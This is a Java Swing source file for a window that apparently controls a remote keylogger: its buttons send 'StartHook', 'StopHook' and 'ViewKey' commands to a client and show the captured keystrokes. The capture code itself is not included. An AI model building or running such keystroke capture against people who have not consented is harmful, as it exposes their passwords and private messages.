import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JTextArea;

public class KeyStroke extends JFrame {
    private JButton butHook = new JButton("<html><center>" + "Hook" + "</center></html>");
    private JButton butUnhook = new JButton("<html><center>" + "Unhook" + "</center></html>");
    private JButton butSave = new JButton("<html><center>" + "Lưu file" + "</center></html>");
    private JButton butDel = new JButton("<html><center>" + "Xóa" + "</center></html>");
    private JButton butView = new JButton("<html><center>" + "Xem" + "</center></html>");
    private JTextArea textArea = new JTextArea();
    private Client client;

    public KeyStroke(Client client) {
        setSize(800, 450);
        setLayout(null);
        setResizable(false);
        setDefaultCloseOperation(DISPOSE_ON_CLOSE);
        this.client = client;
    }

    void Open() {
        PrepareGUI();
        AddAction();
        setVisible(true);
    }

    void PrepareGUI() {
        textArea.setBounds(10, 10, 770, 300);
        textArea.setEditable(false);
        textArea.setBackground(new Color(128, 128, 128));
        butHook.setBounds(10, 320, 80, 80);
        butUnhook.setBounds(100, 320, 80, 80);
        butView.setBounds(200, 320, 80, 80);
        add(textArea);
        add(butHook);
        add(butUnhook);
        add(butView);
    }

    void AddAction() {
        butHook.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.SendCommand("StartHook");
                client.ReceiveCommand();
            }
        });
        butUnhook.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.SendCommand("StopHook");
                client.ReceiveCommand();
            }
        });

        butView.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                client.SendCommand("ViewKey");
                String cmd = client.ReceiveCommand();
                if (cmd.equalsIgnoreCase("ViewKey")) {
                    textArea.setText((String) client.ReceiveData());
                }
            }

        });
    }

}
